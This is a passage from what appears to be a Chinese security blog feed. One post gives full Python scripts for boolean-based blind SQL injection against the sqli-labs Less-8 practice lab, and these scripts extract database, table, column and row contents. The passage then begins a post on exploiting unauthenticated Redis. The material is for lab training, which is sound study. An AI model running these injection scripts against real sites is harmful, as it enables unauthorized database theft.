class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><h3 id="最终脚本"><a href="#最终脚本" class="headerlink" title="最终脚本"></a>最终脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><p><strong>运行测试：</strong></p><p><img src="http://pic.bamboo22.top/image-20230507182521766.png"><br><img src="http://pic.bamboo22.top/image-20230507182613115.png"><br><img src="http://pic.bamboo22.top/image-20230507182736100.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis的几种利用方法"><a href="#Redis的几种利用方法" class="headerlink" title="Redis的几种利用方法"></a>Redis的几种利用方法</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。</p><h2 id="redis漏洞原理"><a href="#redis漏洞原理" class="headerlink" title="redis漏洞原理"></a>redis漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。</p><h2 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h2><p>这里使用的是<strong>kali</strong>和<strong>Ubuntu</strong></p><p><strong>kali下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在redis-2.8.17目录下redis-server开启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170325020.png"></p><p><strong>Ubuntu下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.4.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.4.tar.gz</span><br><span class="line">$ cd redis-2.8.4</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拷贝关键文件</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp 